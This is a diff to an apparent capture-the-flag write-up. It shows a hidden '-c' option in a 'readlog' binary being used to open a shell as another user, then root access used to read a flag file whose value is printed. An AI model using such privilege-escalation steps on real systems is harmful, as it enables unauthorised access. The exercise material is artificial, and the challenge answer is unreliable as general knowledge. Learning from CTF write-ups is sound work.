@@ -228,7 +228,7 @@ The binary has not for purpose to run on your machine, the goal is here to input
 You can see over the different tools and with the above image that there is a command called "execute_command_as_lilith" which smells really good, and in the main function, you can see by the getops function that you also have an hidden option "c" which could stand for "command" so let's try opening a bash with that.
 
 ```
-~ $ readlog -c sh
+~ $ /usr/bin/readlog -c sh
 Executing command as lilith: sh
 ~ $ whoami
 lilith
@@ -262,6 +262,15 @@ Remove (unlink) FILEs
 	-R,-r	Recurse
 /home/deephax # whoami
 root
+/home/deephax #
+```
+
+Then the challenge statement says: "There is a flag that belongs to the root user.". Seems straightforward to me:
+```
+home/deephax # ls /root/
+flag6.txt
+/home/deephax # cat /root/flag6.txt 
+flag{hostbusters6_41a4e1304f74df0c}
 /home/deephax #
 ```
 
